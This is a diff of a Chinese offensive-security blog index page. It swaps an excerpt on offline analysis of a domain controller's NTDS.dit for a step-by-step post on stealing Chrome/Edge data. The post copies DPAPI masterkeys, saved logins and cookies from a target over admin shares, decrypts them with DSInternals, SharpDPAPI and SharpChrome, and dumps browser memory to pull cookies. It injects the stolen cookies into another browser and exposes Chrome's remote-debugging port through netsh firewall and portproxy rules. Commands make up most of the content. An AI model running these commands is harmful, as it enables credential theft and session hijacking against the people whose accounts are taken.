@@ -113,11 +113,11 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2024/11/25/AD-离线分析NTDS.DIT/" >AD-离线分析NTDS.DIT</a>
+			<a href="/2024/11/29/解密chrome浏览器账号密码/" >解密chrome浏览器账号密码</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
-		<div class="date">post @ 2024-11-25  </div>
+		<div class="date">post @ 2024-11-29  </div>
 		</div>
 	</div>
 	
@@ -127,43 +127,48 @@
   <div class="row">
 	
 	
-		<p>曾经有人把这个所谓的“技术”当成宝贝，我问他是什么，他说我不告诉你😅（只是后面定位人员有用）</p>
-<h1><span id="获取ntds和日志">获取NTDS和日志</span></h1><p>通过各种方法将NTDS.dit和edb*的日志文件下载到本地，这里以vssadmin为例</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">cmd</span> /<span class="title">c</span> &quot;<span class="title">copy</span> \\?\<span class="title">GLOBALROOT</span>\<span class="title">Device</span>\<span class="title">HarddiskVolumeShadowCopy1</span>\<span class="title">Windows</span>\<span class="title">NTDS</span>\ <span class="title">C</span>:\<span class="title">NTDS</span>\&quot;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">C</span>:\7<span class="title">z.exe</span> <span class="title">a</span> <span class="title">C</span>:\<span class="title">ntds.zip</span> <span class="title">C</span>:\<span class="title">NTDS</span>\</span></span><br></pre></td></tr></table></figure>
+		<h1><span id="通过文件来获取账号密码">通过文件来获取账号密码</span></h1><h2><span id="从目标机器上获取需要的文件">从目标机器上获取需要的文件</span></h2><p>将目标机器的masterkeys所在的文件夹拷贝到本地</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">robocopy</span> /<span class="title">R</span>:1 /<span class="title">E</span> /<span class="title">MT</span>:3 \\192.168.1.1\<span class="title">c</span>$\<span class="title">users</span>\123\<span class="title">AppData</span>\<span class="title">Roaming</span>\<span class="title">Microsoft</span>\<span class="title">Protect</span> <span class="title">Roaming_Microsoft_Protect</span></span></span><br><span class="line"><span class="function">#主密钥文件所在位置如下</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">C</span>:\<span class="title">Users</span>\&lt;<span class="title">UserName</span>&gt;\<span class="title">AppData</span>\<span class="title">Roaming</span>\<span class="title">Microsoft</span>\<span class="title">Protect</span>\&lt;<span class="title">SID</span>&gt;\&lt;<span class="title">MasterKey</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h1><span id="本地环境配置">本地环境配置</span></h1><p>根据目标机器的系统版本安装对应的版本的系统的虚拟机，安装完成后给该虚拟机安装AD DS角色（注意！如果使用Vmware请关闭VBS，不然在winserver2012及以上由于生成ID不同会导致无法启动ldap服务）</p>
-<p>关闭脚本的链接：</p>
-<p><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-my/download/details.aspx?id=53337">https://www.microsoft.com/en-my/download/details.aspx?id=53337</a></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">ServerManagerCmd</span> -<span class="title">i</span> <span class="title">AD</span>-<span class="title">Domain</span>-<span class="title">Services</span>（<span class="title">winserver</span> 2008）</span></span><br></pre></td></tr></table></figure>
+<p>将目标机器的chrome&#x2F;edge浏览器的数据拷贝到本地（都是sqllite数据库格式的）</p>
+<p>需要解密的就是Local State和Login Data以及Cookies（可能会被占用，可以尝试打快照或者其他拷贝方法）</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">copy</span> &quot;\\192.168.1.1\<span class="title">c</span>$\<span class="title">users</span>\123\<span class="title">appdata</span>\<span class="title">local</span>\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">user</span> <span class="title">data</span>\<span class="title">Local</span> <span class="title">State</span>&quot; .</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">copy</span> &quot;\\192.168.1.1\<span class="title">c</span>$\<span class="title">users</span>\123\<span class="title">appdata</span>\<span class="title">local</span>\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">user</span> <span class="title">data</span>\<span class="title">default</span>\<span class="title">Login</span> <span class="title">Data</span>&quot; .</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">copy</span> &quot;\\192.168.1.1\<span class="title">c</span>$\<span class="title">users</span>\123\<span class="title">appdata</span>\<span class="title">local</span>\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">user</span> <span class="title">data</span>\<span class="title">default</span>\<span class="title">Bookmarks</span>&quot; .</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">copy</span> &quot;\\192.168.1.1\<span class="title">c</span>$\<span class="title">users</span>\123\<span class="title">appdata</span>\<span class="title">local</span>\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">user</span> <span class="title">data</span>\<span class="title">default</span>\<span class="title">History</span>&quot; .</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">copy</span> &quot;\\192.168.1.1\<span class="title">c</span>$\<span class="title">users</span>\123\<span class="title">appdata</span>\<span class="title">local</span>\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">user</span> <span class="title">data</span>\<span class="title">default</span>\<span class="title">Network</span>\<span class="title">Cookies</span>&quot; .</span></span><br></pre></td></tr></table></figure>
 
-<p>接着将之前获取到文件放到跟目标机器一样的目录中。比如我之前是在C:\Windows\NTDS中获取的文件，那么就需要将之前获取的文件放到虚拟机的C:\windows\ntds目录</p>
-<p><img src="/images/1.png" alt="1"></p>
-<h1><span id="修复ntds文件">修复NTDS文件</span></h1><p>尝试恢复ntds数据库</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">esentutl</span> /<span class="title">r</span> <span class="title">edb</span></span></span><br></pre></td></tr></table></figure>
+<h2><span id="从ntds中获取dpapi-backup-keys">从NTDS中获取dpapi backup keys</span></h2><p>需要有ntds.dit文件和域控的system文件，需要用到DSInternals工具</p>
+<p>获取dpapi backup keys（也可以使用对应用户的hash或者密码进行解密，不一定要使用dpapi backup keys）</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">Install</span>-<span class="title">Module</span> <span class="title">DSInternals</span> -<span class="title">Force</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">Get</span>-<span class="title">BootKey</span> -<span class="title">SystemHiveFilePath</span> &#x27;<span class="title">C</span>:\<span class="title">Users</span>\123\<span class="title">Desktop</span>\<span class="title">tmp</span>\<span class="title">system</span>&#x27;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">Get</span>-<span class="title">ADDBBackupKey</span> -<span class="title">DBPath</span> &#x27;<span class="title">C</span>:\<span class="title">Users</span>\123\<span class="title">Desktop</span>\<span class="title">tmp</span>\<span class="title">ntds.dit</span>&#x27; -<span class="title">BootKey</span> 574<span class="title">beb309042a14834a137d5e9ea737b</span> |<span class="title">Save</span>-<span class="title">DPAPIBlob</span> -<span class="title">DirectoryPath</span> .\</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/2.png" alt="2"></p>
-<p>检查ntds.dit的完整性</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">esentutl</span> /<span class="title">g</span> <span class="title">ntds.dit</span></span></span><br></pre></td></tr></table></figure>
+<h2><span id="使用sharpdpapi解密masterkeys">使用SharpDPAPI解密masterkeys</span></h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">SharpDPAPI.exe</span> <span class="title">masterkeys</span> /<span class="title">target:C</span>:\<span class="title">Users</span>\<span class="title">Desktop</span>-123123\<span class="title">Desktop</span>\<span class="title">tmp</span>\<span class="title">Roaming_Microsoft_Protect</span>\&lt;<span class="title">sid</span>&gt; /<span class="title">pvk:C</span>:\<span class="title">Users</span>\<span class="title">Desktop</span>-123\<span class="title">Desktop</span>\<span class="title">tmp</span>\1.<span class="title">pvk</span></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/3.png" alt="3"></p>
-<p>如果结果如上图所示是Intergrity check successful那么就可以直接启动ldap服务了，如果返回的是失败的话就执行下面的命令对ntds.dit进行修复</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">esentutl</span> /<span class="title">p</span> <span class="title">ntds.dit</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/8.png" alt="8"></p>
+<h2><span id="使用sharpchrome获取aes-state-key">使用SharpChrome获取AES State key</span></h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">SharpChrome.exe</span> <span class="title">statekeys</span> /<span class="title">target</span>:&quot;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Desktop</span>-123\<span class="title">Desktop</span>\<span class="title">tmp</span>\<span class="title">Local</span> <span class="title">State</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">SharpChrome.exe</span> <span class="title">statekeys</span> &#123;<span class="title">e5b59270</span>-3061-4377-<span class="title">bbe4</span>-0<span class="title">a6940bcda8f</span>&#125;:664<span class="title">F967A388E2D04D27519851D28A84F8A417032</span> /<span class="title">target</span>:&quot;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Desktop</span>-123\<span class="title">Desktop</span>\<span class="title">tmp</span>\<span class="title">Local</span> <span class="title">State</span>&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h2><span id="启动ldap服务">启动ldap服务</span></h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">dsamain</span> /<span class="title">dbpath</span> <span class="title">ntds.dit</span> /<span class="title">ldapport</span> 389 /<span class="title">allownonadminaccess</span> /<span class="title">allowupgrade</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/9.png" alt="9"></p>
+<p><img src="/images/10.png" alt="10"></p>
+<h2><span id="使用sharpchrome解密login-data">使用SharpChrome解密Login Data</span></h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">SharpChrome.exe</span> <span class="title">logins</span> /<span class="title">statekey</span>:387<span class="title">E1099F65BBCD3AF1A4F709C66ECF6066C6F120303589C063CAAEC726B4376</span> /<span class="title">target</span>:&quot;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Desktop</span>-123\<span class="title">Desktop</span>\<span class="title">tmp</span>\<span class="title">Login</span> <span class="title">Data</span>&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/5.png" alt="5"></p>
-<h3><span id="通过ldap服务收集数据">通过ldap服务收集数据</span></h3><p>曾经有人说很鄙视用工具的人，那工具发明出来是干什么的？就喜欢当原始人是吧？我问他那用什么分析，他说用ADExplorer😅</p>
-<h4><span id="通过powerviewpy查询">通过PowerView.py查询</span></h4><p>注释powerview.py的第87行 #self.flatName &#x3D; self.ldap_server.info.other[“ldapServiceName”][0].split(“@”)[-1].split(“.”)[0]</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ powerview ./administrator:ThisisPassw0rd@192.168.116.154 --use-ldap -p 389</span><br><span class="line">$ Get-DomainUser -Where <span class="string">&#x27;userAccountControl contains TRUSTED_FOR_DELEGATION&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/11.png" alt="11"></p>
+<h1><span id="通过dump目标内存来获取cookie">通过dump目标内存来获取cookie</span></h1><h2><span id="寻找目标chromex2fedge主进程的pid">寻找目标chrome&#x2F;edge主进程的pid</span></h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\WINDOWS\system32&gt; <span class="built_in">Get-WmiObject</span> Win32_Process | <span class="built_in">where</span> &#123;<span class="variable">$_</span>.CommandLine <span class="operator">-match</span> <span class="string">&#x27;network.mojom.NetworkService&#x27;</span>&#125; | <span class="built_in">select</span> <span class="literal">-Property</span> Name,ProcessId</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/6.png" alt="6"></p>
-<h4><span id="通过netexec进行查询">通过netexec进行查询</span></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec ldap 192.168.116.154 -u administrator -p ThisisPassw0rd --query <span class="string">&quot;(&amp;(userAccountControl:1.2.840.113556.1.4.803:=524288)(objectclass=user)(objectCategory=person))&quot;</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/12.png" alt="12"></p>
+<h2><span id="通过各种方式dump目标内存">通过各种方式dump目标内存</span></h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">d</span>:\<span class="title">createdump.exe</span> 15356 -<span class="title">f</span> <span class="title">d</span>:\<span class="title">chrome.dmp</span> --<span class="title">full</span></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/7.png" alt="7"></p>
-<h4><span id="还可以通过ldapdomaindumpadexplorer进行收集等等">还可以通过ldapdomaindump，ADExplorer进行收集等等。。。。</span></h4>
+<h2><span id="使用cookiekatzminidumpexe获取cookie">使用CookieKatzMinidump.exe获取cookie</span></h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">CookieKatzMinidump.exe</span> <span class="title">chrome.dmp</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/13.png" alt="13"></p>
+<h2><span id="使用脚本将cookie注入到chrome中">使用脚本将cookie注入到chrome中</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali python3 RemoteChromiumPwn.py --port 65523 --load-cookies ./cookie.jso</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/chrome.png" alt="chrome"></p>
+<h1><span id="通过chrome远程调试利用not-opsec">通过chrome远程调试利用（not opsec）</span></h1><h2><span id="kill现有的chrome然后重新启动chrome并打开远程调试和恢复上一个session">kill现有的chrome，然后重新启动chrome并打开远程调试和恢复上一个session</span></h2><p>注意：需要在对方的session下执行，也可以尝试修改目标快捷方式</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\WINDOWS\system32&gt; cmd /c <span class="string">&#x27;taskkill /im chrome.exe /F &amp;&amp; &quot;c:\Program Files\Google\Chrome\Application\chrome.exe&quot; --remote-debugging-port=9229 -user-data-dir=&quot;%localappdata%/google/chrome/User Data&quot;--restore-last-session&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="远程调试的端口只开放在127001需要使用netsh将其转发到0000">远程调试的端口只开放在127.0.0.1，需要使用netsh将其转发到0.0.0.0</span></h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">netsh</span> <span class="title">advfirewall</span> <span class="title">firewall</span> <span class="title">add</span> <span class="title">rule</span> <span class="title">name</span>=&quot;9229&quot; <span class="title">dir</span>=<span class="title">in</span> <span class="title">action</span>=<span class="title">allow</span> <span class="title">protocol</span>=<span class="title">TCP</span> <span class="title">localport</span>=9229</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">netsh</span> <span class="title">interface</span> <span class="title">portproxy</span> <span class="title">add</span> <span class="title">v4tov4</span> <span class="title">listenport</span>=9229 <span class="title">listenaddress</span>=0.0.0.0 <span class="title">connectport</span>=9229 <span class="title">connectaddress</span>=127.0.0.1</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="访问目标ip9229x2fjson可以看到对方访问的页面也可以通过websocket接口dump-cookie">访问目标ip:9229&#x2F;json可以看到对方访问的页面，也可以通过websocket接口dump cookie</span></h2><p><img src="/images/remotedebug.png" alt="remotedebug"></p>
+
 	
 	</div>
-  <a type="button" href="/2024/11/25/AD-离线分析NTDS.DIT/#more" class="btn btn-default more">Read More</a>
+  <a type="button" href="/2024/11/29/解密chrome浏览器账号密码/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -182,7 +187,7 @@
 
         <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
  
-          <a type="button" class="btn btn-default disabled">Next<i class="fa fa-arrow-circle-o-right"></i></a>
+       <a href="/page/8/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
         
 
   
@@ -205,6 +210,10 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2024/12/25/o365 &amp; Azure-GoldenSAML/" ><i class="fa fa-file-o"></i>o365 &amp; Azure-GoldenSAML</a>
+      </li>
+    
+      <li>
         <a href="/2024/12/20/C2基础设施搭建/" ><i class="fa fa-file-o"></i>C2基础设施搭建</a>
       </li>
     
@@ -218,10 +227,6 @@
     
       <li>
         <a href="/2024/12/01/AD-滥用DACL/" ><i class="fa fa-file-o"></i>AD-滥用DACL</a>
-      </li>
-    
-      <li>
-        <a href="/2024/12/01/AD-kerberos中的委派/" ><i class="fa fa-file-o"></i>AD-Kerberos中的委派</a>
       </li>
     
   </ul>
